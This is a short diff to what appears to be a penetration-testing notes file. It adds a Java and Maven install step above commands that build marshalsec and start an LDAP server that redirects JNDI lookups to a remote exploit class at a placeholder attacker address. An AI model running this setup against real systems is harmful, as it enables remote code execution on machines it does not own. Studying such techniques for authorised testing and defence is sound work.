@@ -497,6 +497,8 @@ db.dbname.find()
 Install and start LDAP server that redirects to your exploit class:
 https://github.com/mbechler/marshalsec
 
+apt install openjdk-21-jdk maven
+
 git clone https://github.com/mbechler/marshalsec.git
 mvn clean package -DskipTests
 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.IP:8000/#Exploit"
